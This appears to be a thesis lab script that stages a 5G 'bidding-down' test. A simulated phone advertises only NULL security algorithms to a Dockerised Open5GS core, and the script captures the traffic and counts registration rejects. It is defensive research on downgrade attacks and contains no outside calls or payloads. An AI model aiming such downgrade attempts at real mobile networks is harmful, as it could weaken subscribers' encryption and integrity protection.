#!/usr/bin/env python3
"""
Bidding-down Attack - FGT5004
Thesis: On Enhancing 5G Security
Method: UE advertises only NULL security algorithms
"""

import subprocess
import time

CAPTURE_FILE = "/home/eit42s/thesis-5g/captures/bidding_down.pcap"
LOG_FILE     = "/home/eit42s/thesis-5g/logs/bidding_down.log"

def log(msg):
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def main():
    log("=" * 60)
    log("BIDDING-DOWN ATTACK - FGT5004")
    log("Target: NAS Security Mode Command")
    log("Method: UE advertises NULL algorithms only")
    log("=" * 60)

    # PHASE 1: Start capture
    log("\n[PHASE 1] Starting capture...")
    subprocess.run("docker exec open5gs-amf rm -f /tmp/bidding_down.pcap", shell=True)
    tcpdump = subprocess.Popen(
        "docker exec open5gs-amf tcpdump -i any -w /tmp/bidding_down.pcap",
        shell=True
    )
    time.sleep(3)
    log("[*] Capture started.")

    # PHASE 2: Start UE with NULL security
    log("\n[PHASE 2] Starting UE with NULL integrity and NULL ciphering...")
    subprocess.run("docker rm -f ueransim-ue-bidding 2>/dev/null", shell=True)

    cid = subprocess.run(
        """docker run -d \
            --name ueransim-ue-bidding \
            --network thesis-5g_5gcore \
            --ip 10.10.0.42 \
            --privileged \
            -v /home/eit42s/thesis-5g/config/ue-bidding.yaml:/etc/ueransim/ue.yaml \
            ueransim-custom:3.2.7 ue /etc/ueransim/ue.yaml""",
        shell=True, capture_output=True, text=True
    ).stdout.strip()

    time.sleep(20)

    logs = subprocess.run(
        "docker logs ueransim-ue-bidding 2>&1",
        shell=True, capture_output=True, text=True
    ).stdout
    log(f"[*] UE logs:\n{logs[-500:]}")

    # PHASE 3: Stop capture
    log("\n[PHASE 3] Stopping capture...")
    subprocess.run("docker exec open5gs-amf pkill tcpdump", shell=True)
    time.sleep(2)
    subprocess.run(f"docker cp open5gs-amf:/tmp/bidding_down.pcap {CAPTURE_FILE}", shell=True)
    subprocess.run("docker rm -f ueransim-ue-bidding 2>/dev/null", shell=True)

    # PHASE 4: Analyze
    log("\n[PHASE 4] Analyzing security algorithm negotiation...")
    result = subprocess.run(
        f"tshark -r {CAPTURE_FILE} -d 'sctp.port==38412,ngap' 2>/dev/null | grep -i 'reject\\|mismatch'",
        shell=True, capture_output=True, text=True
    ).stdout

    reject_count = result.lower().count("reject")
    log(f"[*] Registration rejects: {reject_count}")
    log(f"[*] Evidence:\n{result}")

    with open(LOG_FILE, 'w') as f:
        f.write(result)

    log("\n" + "=" * 60)
    log("BIDDING-DOWN ATTACK RESULTS")
    log(f"Registration rejects: {reject_count}")
    log("AMF rejected NULL algorithms!" if reject_count > 0 else "No rejection detected")
    log("=" * 60)
    log(f"[*] Log:     {LOG_FILE}")
    log(f"[*] Capture: {CAPTURE_FILE}")

if __name__ == "__main__":
    main()
